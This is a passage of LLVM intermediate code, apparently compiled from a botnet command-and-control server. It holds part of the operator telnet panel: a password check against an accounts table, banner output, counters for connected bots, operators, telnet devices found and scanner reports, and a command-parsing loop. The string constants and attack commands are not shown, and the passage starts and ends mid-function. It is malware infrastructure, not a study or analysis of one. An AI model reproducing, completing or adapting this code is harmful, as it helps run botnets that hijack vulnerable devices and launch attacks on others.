  %166 = call i32 (i8*, i8*, ...) @sprintf(i8* %160, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0), i8* %165) #9
  %167 = load i32, i32* %4, align 4
  %168 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %169 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %170 = call i64 @strlen(i8* %169) #8
  %171 = call i64 @send(i32 %167, i8* %168, i64 %170, i32 16384)
  %172 = icmp eq i64 %171, -1
  br i1 %172, label %173, label %174

173:                                              ; preds = %159
  br label %959

174:                                              ; preds = %159
  %175 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %176 = load i32, i32* %4, align 4
  %177 = call i32 @fdgets(i8* %175, i32 2048, i32 %176)
  %178 = icmp slt i32 %177, 1
  br i1 %178, label %179, label %180

179:                                              ; preds = %174
  br label %959

180:                                              ; preds = %174
  %181 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %181)
  %182 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %184
  %186 = getelementptr inbounds %struct.login_info, %struct.login_info* %185, i32 0, i32 1
  %187 = getelementptr inbounds [100 x i8], [100 x i8]* %186, i64 0, i64 0
  %188 = call i32 @strcmp(i8* %182, i8* %187) #8
  %189 = icmp ne i32 %188, 0
  br i1 %189, label %190, label %191

190:                                              ; preds = %180
  br label %322

191:                                              ; preds = %180
  %192 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %192, i8 0, i64 2048, i1 false)
  %193 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %194 = load i32, i32* %5, align 4
  %195 = sext i32 %194 to i64
  %196 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %195
  %197 = getelementptr inbounds %struct.login_info, %struct.login_info* %196, i32 0, i32 0
  %198 = getelementptr inbounds [100 x i8], [100 x i8]* %197, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %193, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.22, i64 0, i64 0), i8* %198) #9
  %200 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %201 = load i32, i32* %5, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %202
  %204 = getelementptr inbounds %struct.login_info, %struct.login_info* %203, i32 0, i32 0
  %205 = getelementptr inbounds [100 x i8], [100 x i8]* %204, i64 0, i64 0
  %206 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.23, i64 0, i64 0), i8* %205) #9
  %207 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %208 = load i32, i32* %5, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %209
  %211 = getelementptr inbounds %struct.login_info, %struct.login_info* %210, i32 0, i32 0
  %212 = getelementptr inbounds [100 x i8], [100 x i8]* %211, i64 0, i64 0
  %213 = call i32 (i8*, i8*, ...) @sprintf(i8* %207, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.24, i64 0, i64 0), i8* %212) #9
  %214 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %215 = load i32, i32* %5, align 4
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %216
  %218 = getelementptr inbounds %struct.login_info, %struct.login_info* %217, i32 0, i32 0
  %219 = getelementptr inbounds [100 x i8], [100 x i8]* %218, i64 0, i64 0
  %220 = call i32 (i8*, i8*, ...) @sprintf(i8* %214, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.23, i64 0, i64 0), i8* %219) #9
  %221 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %222 = load i32, i32* %5, align 4
  %223 = sext i32 %222 to i64
  %224 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %223
  %225 = getelementptr inbounds %struct.login_info, %struct.login_info* %224, i32 0, i32 0
  %226 = getelementptr inbounds [100 x i8], [100 x i8]* %225, i64 0, i64 0
  %227 = call i32 (i8*, i8*, ...) @sprintf(i8* %221, i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.24, i64 0, i64 0), i8* %226) #9
  %228 = load i32, i32* %4, align 4
  %229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %231 = call i64 @strlen(i8* %230) #8
  %232 = call i64 @send(i32 %228, i8* %229, i64 %231, i32 16384)
  %233 = icmp eq i64 %232, -1
  br i1 %233, label %234, label %235

234:                                              ; preds = %191
  br label %959

235:                                              ; preds = %191
  %236 = load i32, i32* %4, align 4
  %237 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %238 = getelementptr inbounds [500 x i8], [500 x i8]* %21, i64 0, i64 0
  %239 = call i64 @strlen(i8* %238) #8
  %240 = call i64 @send(i32 %236, i8* %237, i64 %239, i32 16384)
  %241 = icmp eq i64 %240, -1
  br i1 %241, label %242, label %243

242:                                              ; preds = %235
  br label %959

243:                                              ; preds = %235
  %244 = call i32 @sleep(i32 1)
  %245 = load i32, i32* %4, align 4
  %246 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %248 = call i64 @strlen(i8* %247) #8
  %249 = call i64 @send(i32 %245, i8* %246, i64 %248, i32 16384)
  %250 = icmp eq i64 %249, -1
  br i1 %250, label %251, label %252

251:                                              ; preds = %243
  br label %959

252:                                              ; preds = %243
  %253 = load i32, i32* %4, align 4
  %254 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %255 = getelementptr inbounds [500 x i8], [500 x i8]* %22, i64 0, i64 0
  %256 = call i64 @strlen(i8* %255) #8
  %257 = call i64 @send(i32 %253, i8* %254, i64 %256, i32 16384)
  %258 = icmp eq i64 %257, -1
  br i1 %258, label %259, label %260

259:                                              ; preds = %252
  br label %959

260:                                              ; preds = %252
  %261 = call i32 @sleep(i32 1)
  %262 = load i32, i32* %4, align 4
  %263 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %265 = call i64 @strlen(i8* %264) #8
  %266 = call i64 @send(i32 %262, i8* %263, i64 %265, i32 16384)
  %267 = icmp eq i64 %266, -1
  br i1 %267, label %268, label %269

268:                                              ; preds = %260
  br label %959

269:                                              ; preds = %260
  %270 = load i32, i32* %4, align 4
  %271 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %272 = getelementptr inbounds [500 x i8], [500 x i8]* %23, i64 0, i64 0
  %273 = call i64 @strlen(i8* %272) #8
  %274 = call i64 @send(i32 %270, i8* %271, i64 %273, i32 16384)
  %275 = icmp eq i64 %274, -1
  br i1 %275, label %276, label %277

276:                                              ; preds = %269
  br label %959

277:                                              ; preds = %269
  %278 = call i32 @sleep(i32 1)
  %279 = load i32, i32* %4, align 4
  %280 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %281 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %282 = call i64 @strlen(i8* %281) #8
  %283 = call i64 @send(i32 %279, i8* %280, i64 %282, i32 16384)
  %284 = icmp eq i64 %283, -1
  br i1 %284, label %285, label %286

285:                                              ; preds = %277
  br label %959

286:                                              ; preds = %277
  %287 = load i32, i32* %4, align 4
  %288 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %289 = getelementptr inbounds [500 x i8], [500 x i8]* %24, i64 0, i64 0
  %290 = call i64 @strlen(i8* %289) #8
  %291 = call i64 @send(i32 %287, i8* %288, i64 %290, i32 16384)
  %292 = icmp eq i64 %291, -1
  br i1 %292, label %293, label %294

293:                                              ; preds = %286
  br label %959

294:                                              ; preds = %286
  %295 = call i32 @sleep(i32 1)
  %296 = load i32, i32* %4, align 4
  %297 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %298 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %299 = call i64 @strlen(i8* %298) #8
  %300 = call i64 @send(i32 %296, i8* %297, i64 %299, i32 16384)
  %301 = icmp eq i64 %300, -1
  br i1 %301, label %302, label %303

302:                                              ; preds = %294
  br label %959

303:                                              ; preds = %294
  %304 = load i32, i32* %4, align 4
  %305 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %306 = getelementptr inbounds [500 x i8], [500 x i8]* %25, i64 0, i64 0
  %307 = call i64 @strlen(i8* %306) #8
  %308 = call i64 @send(i32 %304, i8* %305, i64 %307, i32 16384)
  %309 = icmp eq i64 %308, -1
  br i1 %309, label %310, label %311

310:                                              ; preds = %303
  br label %959

311:                                              ; preds = %303
  %312 = call i32 @sleep(i32 1)
  %313 = load i32, i32* %4, align 4
  %314 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %316 = call i64 @strlen(i8* %315) #8
  %317 = call i64 @send(i32 %313, i8* %314, i64 %316, i32 16384)
  %318 = icmp eq i64 %317, -1
  br i1 %318, label %319, label %320

319:                                              ; preds = %311
  br label %959

320:                                              ; preds = %311
  br label %328

321:                                              ; preds = %131
  br label %322

322:                                              ; preds = %321, %190
  %323 = load i32, i32* %4, align 4
  %324 = call i64 @send(i32 %323, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i64 5, i32 16384)
  %325 = icmp eq i64 %324, -1
  br i1 %325, label %326, label %327

326:                                              ; preds = %322
  br label %959

327:                                              ; preds = %322
  br label %959

328:                                              ; preds = %320
  %329 = load i8*, i8** %3, align 8
  %330 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %329) #9
  %331 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %332 = call i32 (i8*, i8*, ...) @sprintf(i8* %331, i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.25, i64 0, i64 0)) #9
  %333 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %334 = call i32 (i8*, i8*, ...) @sprintf(i8* %333, i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.26, i64 0, i64 0)) #9
  %335 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %336 = call i32 (i8*, i8*, ...) @sprintf(i8* %335, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.27, i64 0, i64 0)) #9
  %337 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %338 = call i32 (i8*, i8*, ...) @sprintf(i8* %337, i8* getelementptr inbounds ([96 x i8], [96 x i8]* @.str.28, i64 0, i64 0)) #9
  %339 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %340 = call i32 (i8*, i8*, ...) @sprintf(i8* %339, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.29, i64 0, i64 0)) #9
  %341 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %342 = call i32 (i8*, i8*, ...) @sprintf(i8* %341, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.30, i64 0, i64 0)) #9
  %343 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %344 = call i32 (i8*, i8*, ...) @sprintf(i8* %343, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.31, i64 0, i64 0)) #9
  %345 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %346 = call i32 (i8*, i8*, ...) @sprintf(i8* %345, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.32, i64 0, i64 0)) #9
  %347 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %348 = call i32 (i8*, i8*, ...) @sprintf(i8* %347, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.33, i64 0, i64 0)) #9
  %349 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %350 = call i32 (i8*, i8*, ...) @sprintf(i8* %349, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.34, i64 0, i64 0)) #9
  %351 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %352 = call i32 (i8*, i8*, ...) @sprintf(i8* %351, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.35, i64 0, i64 0)) #9
  %353 = load i32, i32* %4, align 4
  %354 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %355 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %356 = call i64 @strlen(i8* %355) #8
  %357 = call i64 @send(i32 %353, i8* %354, i64 %356, i32 16384)
  %358 = icmp eq i64 %357, -1
  br i1 %358, label %359, label %360

359:                                              ; preds = %328
  br label %959

360:                                              ; preds = %328
  %361 = load i32, i32* %4, align 4
  %362 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %363 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %364 = call i64 @strlen(i8* %363) #8
  %365 = call i64 @send(i32 %361, i8* %362, i64 %364, i32 16384)
  %366 = icmp eq i64 %365, -1
  br i1 %366, label %367, label %368

367:                                              ; preds = %360
  br label %959

368:                                              ; preds = %360
  %369 = load i32, i32* %4, align 4
  %370 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %371 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %372 = call i64 @strlen(i8* %371) #8
  %373 = call i64 @send(i32 %369, i8* %370, i64 %372, i32 16384)
  %374 = icmp eq i64 %373, -1
  br i1 %374, label %375, label %376

375:                                              ; preds = %368
  br label %959

376:                                              ; preds = %368
  %377 = load i32, i32* %4, align 4
  %378 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %379 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %380 = call i64 @strlen(i8* %379) #8
  %381 = call i64 @send(i32 %377, i8* %378, i64 %380, i32 16384)
  %382 = icmp eq i64 %381, -1
  br i1 %382, label %383, label %384

383:                                              ; preds = %376
  br label %959

384:                                              ; preds = %376
  %385 = load i32, i32* %4, align 4
  %386 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %387 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %388 = call i64 @strlen(i8* %387) #8
  %389 = call i64 @send(i32 %385, i8* %386, i64 %388, i32 16384)
  %390 = icmp eq i64 %389, -1
  br i1 %390, label %391, label %392

391:                                              ; preds = %384
  br label %959

392:                                              ; preds = %384
  %393 = load i32, i32* %4, align 4
  %394 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %395 = getelementptr inbounds [5000 x i8], [5000 x i8]* %31, i64 0, i64 0
  %396 = call i64 @strlen(i8* %395) #8
  %397 = call i64 @send(i32 %393, i8* %394, i64 %396, i32 16384)
  %398 = icmp eq i64 %397, -1
  br i1 %398, label %399, label %400

399:                                              ; preds = %392
  br label %959

400:                                              ; preds = %392
  %401 = load i32, i32* %4, align 4
  %402 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %32, i64 0, i64 0
  %404 = call i64 @strlen(i8* %403) #8
  %405 = call i64 @send(i32 %401, i8* %402, i64 %404, i32 16384)
  %406 = icmp eq i64 %405, -1
  br i1 %406, label %407, label %408

407:                                              ; preds = %400
  br label %959

408:                                              ; preds = %400
  %409 = load i32, i32* %4, align 4
  %410 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %33, i64 0, i64 0
  %412 = call i64 @strlen(i8* %411) #8
  %413 = call i64 @send(i32 %409, i8* %410, i64 %412, i32 16384)
  %414 = icmp eq i64 %413, -1
  br i1 %414, label %415, label %416

415:                                              ; preds = %408
  br label %959

416:                                              ; preds = %408
  %417 = load i32, i32* %4, align 4
  %418 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %420 = call i64 @strlen(i8* %419) #8
  %421 = call i64 @send(i32 %417, i8* %418, i64 %420, i32 16384)
  %422 = icmp eq i64 %421, -1
  br i1 %422, label %423, label %424

423:                                              ; preds = %416
  br label %959

424:                                              ; preds = %416
  %425 = load i32, i32* %4, align 4
  %426 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %427 = getelementptr inbounds [5000 x i8], [5000 x i8]* %35, i64 0, i64 0
  %428 = call i64 @strlen(i8* %427) #8
  %429 = call i64 @send(i32 %425, i8* %426, i64 %428, i32 16384)
  %430 = icmp eq i64 %429, -1
  br i1 %430, label %431, label %432

431:                                              ; preds = %424
  br label %959

432:                                              ; preds = %424
  %433 = load i32, i32* %4, align 4
  %434 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %436 = call i64 @strlen(i8* %435) #8
  %437 = call i64 @send(i32 %433, i8* %434, i64 %436, i32 16384)
  %438 = icmp eq i64 %437, -1
  br i1 %438, label %439, label %440

439:                                              ; preds = %432
  br label %959

440:                                              ; preds = %432
  br label %441

441:                                              ; preds = %440
  %442 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %443 = load i32, i32* %5, align 4
  %444 = sext i32 %443 to i64
  %445 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %444
  %446 = getelementptr inbounds %struct.login_info, %struct.login_info* %445, i32 0, i32 0
  %447 = getelementptr inbounds [100 x i8], [100 x i8]* %446, i64 0, i64 0
  %448 = call i32 (i8*, i8*, ...) @sprintf(i8* %442, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %447) #9
  %449 = load i32, i32* %4, align 4
  %450 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %452 = call i64 @strlen(i8* %451) #8
  %453 = call i64 @send(i32 %449, i8* %450, i64 %452, i32 16384)
  %454 = icmp eq i64 %453, -1
  br i1 %454, label %455, label %456

455:                                              ; preds = %441
  br label %959

456:                                              ; preds = %441
  br label %457

457:                                              ; preds = %456
  %458 = load i8*, i8** %3, align 8
  %459 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %458) #9
  %460 = load i32, i32* %4, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %461
  %463 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %462, i32 0, i32 0
  store i32 1, i32* %463, align 4
  br label %464

464:                                              ; preds = %925, %924, %881, %760, %719, %714, %630, %526, %457
  %465 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %466 = load i32, i32* %4, align 4
  %467 = call i32 @fdgets(i8* %465, i32 2048, i32 %466)
  %468 = icmp sgt i32 %467, 0
  br i1 %468, label %469, label %958

469:                                              ; preds = %464
  %470 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %471 = call i8* @strstr(i8* %470, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0)) #8
  %472 = icmp ne i8* %471, null
  br i1 %472, label %473, label %527

473:                                              ; preds = %469
  %474 = getelementptr inbounds [2048 x i8], [2048 x i8]* %38, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %474, i8 0, i64 2048, i1 false)
  %475 = getelementptr inbounds [2048 x i8], [2048 x i8]* %39, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %475, i8 0, i64 2048, i1 false)
  %476 = getelementptr inbounds [2048 x i8], [2048 x i8]* %38, i64 0, i64 0
  %477 = call i32 @BotsConnected()
  %478 = load volatile i32, i32* @OperatorsConnected, align 4
  %479 = call i32 (i8*, i8*, ...) @sprintf(i8* %476, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.38, i64 0, i64 0), i32 %477, i32 %478) #9
  %480 = getelementptr inbounds [2048 x i8], [2048 x i8]* %39, i64 0, i64 0
  %481 = load volatile i32, i32* @TELFound, align 4
  %482 = load volatile i32, i32* @scannerreport, align 4
  %483 = call i32 (i8*, i8*, ...) @sprintf(i8* %480, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.39, i64 0, i64 0), i32 %481, i32 %482) #9
  %484 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %485 = load volatile i32, i32* @OperatorsConnected, align 4
  %486 = load volatile i32, i32* @scannerreport, align 4
  %487 = call i32 (i8*, i8*, ...) @sprintf(i8* %484, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.40, i64 0, i64 0), i32 %485, i32 %486) #9
  %488 = load i32, i32* %4, align 4
  %489 = getelementptr inbounds [2048 x i8], [2048 x i8]* %38, i64 0, i64 0
  %490 = getelementptr inbounds [2048 x i8], [2048 x i8]* %38, i64 0, i64 0
  %491 = call i64 @strlen(i8* %490) #8
  %492 = call i64 @send(i32 %488, i8* %489, i64 %491, i32 16384)
  %493 = icmp eq i64 %492, -1
  br i1 %493, label %494, label %495

494:                                              ; preds = %473
  store i8* null, i8** %2, align 8
  br label %968

495:                                              ; preds = %473
  %496 = load i32, i32* %4, align 4
  %497 = getelementptr inbounds [2048 x i8], [2048 x i8]* %39, i64 0, i64 0
  %498 = getelementptr inbounds [2048 x i8], [2048 x i8]* %39, i64 0, i64 0
  %499 = call i64 @strlen(i8* %498) #8
  %500 = call i64 @send(i32 %496, i8* %497, i64 %499, i32 16384)
  %501 = icmp eq i64 %500, -1
  br i1 %501, label %502, label %503

502:                                              ; preds = %495
  store i8* null, i8** %2, align 8
  br label %968

503:                                              ; preds = %495
  %504 = load i32, i32* %4, align 4
  %505 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %506 = getelementptr inbounds [2048 x i8], [2048 x i8]* %40, i64 0, i64 0
  %507 = call i64 @strlen(i8* %506) #8
  %508 = call i64 @send(i32 %504, i8* %505, i64 %507, i32 16384)
  %509 = icmp eq i64 %508, -1
  br i1 %509, label %510, label %511

510:                                              ; preds = %503
  store i8* null, i8** %2, align 8
  br label %968

511:                                              ; preds = %503
  %512 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %513 = load i32, i32* %5, align 4
  %514 = sext i32 %513 to i64
  %515 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %514
  %516 = getelementptr inbounds %struct.login_info, %struct.login_info* %515, i32 0, i32 0
  %517 = getelementptr inbounds [100 x i8], [100 x i8]* %516, i64 0, i64 0
  %518 = call i32 (i8*, i8*, ...) @sprintf(i8* %512, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.36, i64 0, i64 0), i8* %517) #9
  %519 = load i32, i32* %4, align 4
  %520 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %521 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %522 = call i64 @strlen(i8* %521) #8
  %523 = call i64 @send(i32 %519, i8* %520, i64 %522, i32 16384)
  %524 = icmp eq i64 %523, -1
  br i1 %524, label %525, label %526

525:                                              ; preds = %511
  br label %959

526:                                              ; preds = %511
  br label %464, !llvm.loop !19

527:                                              ; preds = %469
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %529 = call i8* @strstr(i8* %528, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.41, i64 0, i64 0)) #8
  %530 = icmp ne i8* %529, null
  br i1 %530, label %531, label %631

531:                                              ; preds = %527
  %532 = load i8*, i8** %3, align 8
  %533 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %532) #9
  %534 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %535 = call i32 (i8*, i8*, ...) @sprintf(i8* %534, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.42, i64 0, i64 0)) #9
  %536 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %537 = call i32 (i8*, i8*, ...) @sprintf(i8* %536, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.43, i64 0, i64 0)) #9
  %538 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %539 = call i32 (i8*, i8*, ...) @sprintf(i8* %538, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.44, i64 0, i64 0)) #9
  %540 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %541 = call i32 (i8*, i8*, ...) @sprintf(i8* %540, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.45, i64 0, i64 0)) #9
  %542 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %543 = call i32 (i8*, i8*, ...) @sprintf(i8* %542, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.46, i64 0, i64 0)) #9
  %544 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %545 = call i32 (i8*, i8*, ...) @sprintf(i8* %544, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.47, i64 0, i64 0)) #9
  %546 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %547 = call i32 (i8*, i8*, ...) @sprintf(i8* %546, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i64 0, i64 0)) #9
  %548 = getelementptr inbounds [800 x i8], [800 x i8]* %49, i64 0, i64 0
  %549 = call i32 (i8*, i8*, ...) @sprintf(i8* %548, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.49, i64 0, i64 0)) #9
  %550 = load i32, i32* %4, align 4
  %551 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %552 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %553 = call i64 @strlen(i8* %552) #8
  %554 = call i64 @send(i32 %550, i8* %551, i64 %553, i32 16384)
  %555 = icmp eq i64 %554, -1
  br i1 %555, label %556, label %557

556:                                              ; preds = %531
  br label %959

557:                                              ; preds = %531
  %558 = load i32, i32* %4, align 4
  %559 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %560 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %561 = call i64 @strlen(i8* %560) #8
  %562 = call i64 @send(i32 %558, i8* %559, i64 %561, i32 16384)
  %563 = icmp eq i64 %562, -1
  br i1 %563, label %564, label %565

564:                                              ; preds = %557
  br label %959

565:                                              ; preds = %557
  %566 = load i32, i32* %4, align 4
  %567 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %568 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %569 = call i64 @strlen(i8* %568) #8
  %570 = call i64 @send(i32 %566, i8* %567, i64 %569, i32 16384)
  %571 = icmp eq i64 %570, -1
  br i1 %571, label %572, label %573

572:                                              ; preds = %565
  br label %959

573:                                              ; preds = %565
  %574 = load i32, i32* %4, align 4
  %575 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %576 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %577 = call i64 @strlen(i8* %576) #8
  %578 = call i64 @send(i32 %574, i8* %575, i64 %577, i32 16384)
  %579 = icmp eq i64 %578, -1
  br i1 %579, label %580, label %581

580:                                              ; preds = %573
  br label %959

581:                                              ; preds = %573
  %582 = load i32, i32* %4, align 4
  %583 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %584 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %585 = call i64 @strlen(i8* %584) #8
  %586 = call i64 @send(i32 %582, i8* %583, i64 %585, i32 16384)
  %587 = icmp eq i64 %586, -1
  br i1 %587, label %588, label %589

588:                                              ; preds = %581
  br label %959

589:                                              ; preds = %581
